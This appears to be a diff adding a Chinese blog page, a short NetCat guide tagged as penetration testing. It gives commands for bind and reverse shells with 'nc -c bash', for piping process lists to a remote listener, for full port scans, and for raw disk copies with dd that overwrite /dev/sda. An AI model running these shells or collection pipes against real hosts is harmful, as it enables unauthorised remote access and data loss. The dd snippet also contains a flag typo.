@@ -1,0 +1,373 @@
+<html>
+
+<head>
+	<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>NetCat使用指南 | 一小步</title>
+<!-- description在post页面应有不同 -->
+
+	<meta name="description" content="每天进步一点点" />
+	
+<link rel="shortcut icon" href="https://MaHule.github.io/favicon.ico?v=1665048734325">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+<link rel="stylesheet" href="https://MaHule.github.io/styles/main.css">
+
+
+</head>
+
+<body>
+	<div id="app" class="main px-4 flex flex-col lg:flex-row">
+		<div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+	<div class="lg:sticky top-0">
+		<div class="sidebar-content">
+			<div
+				class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+				<i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+				<a href="https://MaHule.github.io">
+					<img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12"
+						src="https://MaHule.github.io/images/avatar.png?v=1665048734325" alt="">
+				</a>
+				<h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl"
+					style="animation-delay: 0.2s">一小步</h1>
+			</div>
+			
+			<div class="animated fadeInLeft" style="animation-delay: 0.4s">
+				<p class="my-4 text-gray-600 font-light hidden lg:block">
+					文章目录
+				</p>
+				<div class="toc-container hidden lg:block">
+					<ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD">主要功能</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%B7%E4%BD%93%E4%BB%8B%E7%BB%8D">具体介绍</a>
+<ul>
+<li><a href="#01-nc%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6">01. NC远程控制</a></li>
+<li><a href="#02-%E4%BD%BF%E7%94%A8nc%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">02. 使用NC进行信息收集</a></li>
+<li><a href="#03-nc%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6">03. NC传输文件</a></li>
+<li><a href="#04nc%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93">04.NC文件加密传输</a></li>
+<li><a href="#05-nc%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1">05. NC流媒体服务</a></li>
+<li><a href="#06-nc%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">06. NC端口扫描</a></li>
+<li><a href="#07nc%E5%A4%8D%E5%88%B6%E7%A3%81%E7%9B%98">07.NC复制磁盘</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+				</div>
+			</div>
+			
+		</div>
+	</div>
+</div>
+
+<div class="menu-container">
+	<i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+	<div>
+		
+		
+		<a href="/" class="menu" style="animation-delay: 0s">
+			首页
+		</a>
+		
+		
+		
+		<a href="/archives" class="menu" style="animation-delay: 0.2s">
+			归档
+		</a>
+		
+		
+		
+		<a href="/tags" class="menu" style="animation-delay: 0.4s">
+			标签
+		</a>
+		
+		
+		
+		<a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+			关于
+		</a>
+		
+		
+	</div>
+	<!-- 萌备 https://icp.gov.moe -->
+	<div class="site-footer">
+		<p class="py-4 text-gray-700">
+			© 2022 hope140  <br>
+			<span id="runtime_span"></span> <br>
+			<a href="https://icp.gov.moe/?keyword=20221443" target="_blank">萌ICP备20221443号</a> <br>
+			Powered by MaHule
+		</p>
+		<a class="rss" href="https://MaHule.github.io/atom.xml" target="_blank">RSS</a>
+	</div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+		<div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+			<h1 class="text-3xl font-bold lg:mt-16">
+				NetCat使用指南
+			</h1>
+			<!-- 由于"/"字符只好做postPath的判断，不设定postPath时是一个长度为0的字符串 -->
+			
+			<div class="text-sm text-gray-700 lg:my-8">
+				2020-04-15 / 3 min read / <span id="/netcat-shi-yong-zhi-nan/"
+					class="waline-pageview-count"> </span> 阅读 / <span id="/netcat-shi-yong-zhi-nan/"
+					class="waline-comment-count"></span>评论
+			</div>
+			
+			<!-- 如果有更好办法再做修改 -->
+			
+			<div class="post-content yue">
+				<p>NC(netcat)被称为网络工具中的瑞士军刀，体积小巧，但功能强大</p>
+<!-- more -->
+<h4 id="主要功能">主要功能</h4>
+<blockquote>
+<p>可以在两台设备上面相互交互，即侦听模式/传输模式</p>
+</blockquote>
+<ul>
+<li>Telnet功能</li>
+<li>获取banner信息</li>
+<li>传输文本信息</li>
+<li>传输文件/目录</li>
+<li>加密传输文件，默认不加密</li>
+<li>远程控制</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+</ul>
+<h3 id="具体介绍">具体介绍</h3>
+<p><code>nc -h</code> 查看nc的传输说明：</p>
+<figure data-type="image" tabindex="1"><img src="https://MaHule.github.io/post-images/netcat/01.png" alt="netcat" loading="lazy"></figure>
+<h4 id="01-nc远程控制">01. NC远程控制</h4>
+<p>正向连接：</p>
+<pre><code class="language-bash">A: nc -lp 需要开放端口 -c bash   #服务器开放端口，等待连接
+
+B: nc ip:port     #客户机连接服务器
+
+#A将自己的bash发送给B
+</code></pre>
+<p>反向连接：</p>
+<pre><code class="language-bash">A: nc -lp port 
+
+B: nc ip port -c bash
+
+#B将自己的bash发给A
+</code></pre>
+<p><strong>注：</strong> Windows下需要将Bash换成cmd</p>
+<h4 id="02-使用nc进行信息收集">02. 使用NC进行信息收集</h4>
+<ol>
+<li>简单的建立连接（双方可以进行文本信息的交换）</li>
+</ol>
+<pre><code class="language-bash">A: nc -l -p port     #监听指定端口号
+
+B: nc -nv ip port    #连接对方tcp端口，默认情况下，双方可以发送文本信息 
+</code></pre>
+<ol start="2">
+<li>收集目标主机上的进程信息</li>
+</ol>
+<pre><code class="language-bash">nc -l -p 4444 &gt; wing.txt     #将远程发送过来的内容保存在本地
+
+ps -aux | nc -nv ip port -q 1  #标准输入完成后delay一秒钟，会发送到侦听端
+</code></pre>
+<h4 id="03-nc传输文件">03. NC传输文件</h4>
+<pre><code class="language-bash">A: nc -lp 4444 &gt; 1.txt     #打开4444端口，将接受到的数据保存为1.txt
+
+B: nc -nv ip port &lt; 1.txt -q 1  #将文件发送给侦听端
+
+#PS：侦听端口接受的文件名最好于发送端发送文件的名字一致
+
+</code></pre>
+<h4 id="04nc文件加密传输">04.NC文件加密传输</h4>
+<pre><code class="language-bash">A: nc -lp port | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 文件名
+
+B: mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; 文件名 | nc -nv ip port -q 1
+</code></pre>
+<p><strong>注：</strong> B将文件加密发送，A接受后先保存到本地，B在一秒后退出。加密方式利用的是mcrypt加密</p>
+<h4 id="05-nc流媒体服务">05. NC流媒体服务</h4>
+<pre><code class="language-bash">A: cat wing.mp4 | nc -lp port    #用cat打开视频文件，然后将视频文件通过nc发送
+
+B: nc -nv ip port | mplayer -vo x11 -cache 4000  #将接收到的流媒体文件通过mplayer（是一个视频的播放器）打开。
+</code></pre>
+<h4 id="06-nc端口扫描">06. NC端口扫描</h4>
+<pre><code class="language-bash">nc -nvz ip 1-65535      #扫描tcp中1-65535端口的开放情况
+</code></pre>
+<pre><code class="language-bash">nc -nvzu ip 1-65535     #扫描udp中1-65535端口的开放情况
+</code></pre>
+<h4 id="07nc复制磁盘">07.NC复制磁盘</h4>
+<pre><code class="language-bash">A: nc -lp port | dd of=/dev/sda
+
+B: dd if=/dev/sda | nc -nc ip port -q 1
+
+if = input filter
+of = output filter
+
+
+#B将数据复制到A挂载的硬盘上
+</code></pre>
+
+			</div>
+
+			
+			<a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 "
+				href="https://MaHule.github.io/PmmDJSBWv/">
+				<span class="flex-auto">
+					渗透测试
+				</span>
+			</a>
+			
+
+			<div class="post-Copyright py-12">
+				<span class="flex-auto"> 本文来源于 一小步</span>
+				<div class="prev-post">
+					<a href="https://MaHule.github.io">
+						<h3 class="post-Copyright-link">
+							博客地址： https://MaHule.github.io
+						</h3>
+					</a>
+				</div>
+			</div>
+
+			<div class="flex justify-between py-8">
+				
+				<div class="prev-post">
+					<a href="https://MaHule.github.io/docker-ji-ben-zhi-shi/">
+						<h3 class="post-title">
+							<i class="ri-arrow-left-line"></i>
+							Docker基本知识
+						</h3>
+					</a>
+				</div>
+				
+
+				
+				<div class="next-post">
+					<a href="https://MaHule.github.io/内网穿透神器：FRP/">
+						<h3 class="post-title">
+							内网穿透神器:FRP
+							<i class="ri-arrow-right-line"></i>
+						</h3>
+					</a>
+				</div>
+				
+			</div>
+
+			
+			
+			
+
+		</div>
+	</div>
+
+	<script src="https://MaHule.github.io/media/prism.js"></script>
+<script type="text/javascript" src="https://MaHule.github.io/media/show_runtime.js"></script>
+<script type="text/javascript" src="https://MaHule.github.io/media/clipboard.js"></script>
+<script>
+	Prism.highlightAll()
+	let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+	// This should probably be throttled.
+	// Especially because it triggers during smooth scrolling.
+	// https://lodash.com/docs/4.17.10#throttle
+	// You could do like...
+	// window.addEventListener("scroll", () => {
+	//    _.throttle(doThatStuff, 100);
+	// });
+	// Only not doing it here to keep this Pen dependency-free.
+
+	window.addEventListener("scroll", event => {
+		let fromTop = window.scrollY;
+
+		mainNavLinks.forEach((link, index) => {
+			let section = document.getElementById(decodeURI(link.hash).substring(1));
+			let nextSection = null
+			if (mainNavLinks[index + 1]) {
+				nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(
+				1));
+			}
+			if (section.offsetTop <= fromTop) {
+				if (nextSection) {
+					if (nextSection.offsetTop > fromTop) {
+						link.classList.add("current");
+					} else {
+						link.classList.remove("current");
+					}
+				} else {
+					link.classList.add("current");
+				}
+			} else {
+				link.classList.remove("current");
+			}
+		});
+	});
+
+
+	document.addEventListener("DOMContentLoaded", function () {
+		var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+		if ("IntersectionObserver" in window) {
+			let lazyImageObserver = new IntersectionObserver(function (entries, observer) {
+				entries.forEach(function (entry) {
+					if (entry.isIntersecting) {
+						let lazyImage = entry.target
+						lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+						lazyImage.classList.remove("lazy")
+						lazyImageObserver.unobserve(lazyImage)
+					}
+				});
+			});
+
+			lazyImages.forEach(function (lazyImage) {
+				lazyImageObserver.observe(lazyImage)
+			})
+		} else {
+			// Possibly fall back to a more compatible method here
+		}
+	});
+
+	const menuContainer = document.querySelector('.menu-container')
+	const menus = document.querySelectorAll('.menu-container .menu')
+	const mask = document.querySelector('.mask')
+	const contentWrapper = document.querySelector('.content-wrapper')
+	const latestArticle = document.querySelector('.latest-article')
+	const readMore = document.querySelector('.read-more')
+	const indexPage = document.querySelector('.index-page')
+
+	const isHome = location.pathname === '/'
+	if (latestArticle) {
+		latestArticle.style.display = isHome ? 'block' : 'none'
+		readMore.style.display = isHome ? 'block' : 'none'
+		indexPage.style.display = isHome ? 'none' : 'block'
+	}
+
+	const openMenu = () => {
+		menuContainer.classList.add('open')
+		menus.forEach(menu => {
+			menu.classList.add('animated', 'fadeInLeft')
+		})
+		mask.classList.add('open')
+		contentWrapper.classList.add('is-second')
+	}
+
+	const closeMenu = () => {
+		menuContainer.classList.remove('open')
+		menus.forEach(menu => {
+			menu.classList.remove('animated', 'fadeInLeft')
+		})
+		mask.classList.remove('open')
+		contentWrapper.classList.remove('is-second')
+	}
+</script>
+</body>
+
+</html>
